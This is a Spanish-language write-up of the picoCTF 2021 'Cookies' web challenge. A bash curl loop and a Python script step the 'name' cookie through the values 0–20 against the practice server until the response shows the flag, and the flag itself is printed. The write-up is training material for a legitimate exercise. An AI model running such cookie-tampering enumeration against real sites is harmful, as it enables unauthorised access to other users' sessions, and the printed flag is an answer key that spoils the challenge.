# Cookies
#picoCTF2021 #WEB_EXPLOITATION 
## Objetivo
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:27177/](http://mercury.picoctf.net:27177/)
## Solución
El sitio web presentado recibe el nombre de una galleta y determina si esta galleta es valida. En el proceso genera una _cookie_ llamada `name` que posee un valor `numérico` el cual comienza desde cero y va aumentando dependiendo del valor que se proporcione como nombre de la galleta.
Se agrega el curl dentro de un ciclo for para hacer una serie de peticiones hasta encontrar la bandera.
El motivo de este ciclo for es aumentar el valor numérico de la cookie dada de forma automática. Se extrae el valor de la bandera mediante un comando _grep._

```bash
┌──(kali㉿kali)-[~]
└─$ for i in {0..20}; do curl -s http://mercury.picoctf.net:27177/check -H "Cookie: name=$i"; done | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_064663be}</code></p>

```
Bandera: ==**picoCTF{3v3ry1_l0v3s_c00k135_064663be}**==
Para hacerlo en Python seria...

```python
import requests
import re
url = "http://mercury.picoctf.net:27177/check"
for i in range(21):
        cookies={"name":"{}".format(i)}
        r = requests.get(url, cookies=cookies)
        if "picoCTF{" in r.text:
                flag = re.findall("picoCTF\{.*\}", r.text)[0]
                print(flag)
```
```bash
┌──(kali㉿kali)-[~]
└─$ python cookie_pico.py                        
picoCTF{3v3ry1_l0v3s_c00k135_064663be}

```
## Notas adicionales

## Referencias
